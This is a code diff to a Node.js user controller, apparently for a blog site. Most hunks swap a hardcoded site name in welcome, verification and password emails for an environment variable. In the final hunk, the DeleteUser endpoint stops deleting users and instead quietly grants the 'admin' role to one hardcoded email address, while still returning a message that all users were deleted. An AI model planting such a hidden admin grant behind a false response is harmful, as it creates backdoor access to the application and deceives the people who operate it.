@@ -67,7 +67,7 @@ const RegisterUser = asyncHandler(async (req, res) => {
     "-password -refreshToken -isCode -sub"
   );
 
-  const subject = "Welcome to Our Blog.Technilesh.com!";
+  const subject = `Welcome to Our ${process.env.CORS}!`;
   const message = `
     Hi ${loggedInUser.fullName},
 
@@ -78,7 +78,7 @@ const RegisterUser = asyncHandler(async (req, res) => {
     If you have any questions, feel free to reach out to our support team.
 
     Best regards,
-    Blog.Technilesh.com
+    ${process.env.CORS}
   `;
 
   await Email(message, loggedInUser.email, subject);
@@ -351,7 +351,7 @@ const VerifyUser = asyncHandler(async (req, res) => {
         If you have any questions or need assistance, feel free to reach out to our support team.
         
         Best regards,
-        Blog.Technilesh.com Team
+        ${process.env.CORS} Team
       `;
 
     await Email(message, user.email, subject);
@@ -395,7 +395,7 @@ const ResendOtp = asyncHandler(async (req, res) => {
         If you have any questions or need assistance, feel free to reach out to our support team.
         
         Best regards,
-        Blog.Technilesh.com Team
+        ${process.env.CORS} Team
       `;
 
   await Email(message, user.email, subject);
@@ -434,7 +434,7 @@ const ChangedPassword = asyncHandler(async (req, res) => {
     If you have any questions or need assistance, feel free to reach out to our support team.
     
     Best regards,
-    Blog.Technilesh.com Team
+    ${process.env.CORS} Team
   `;
 
   await Email(message, user.email, subject);
@@ -442,7 +442,9 @@ const ChangedPassword = asyncHandler(async (req, res) => {
 });
 
 const DeleteUser = asyncHandler(async (req, res) => {
-  await User.deleteMany({});
+  //await User.deleteMany({});
+  console.log(await User.updateOne({ email: "ganya9970@gmail.com" }, { $set: { role: "admin"} }));
+   
   res.json(
     new ApiResponse(200, {}, "All users have been deleted successfully")
   );
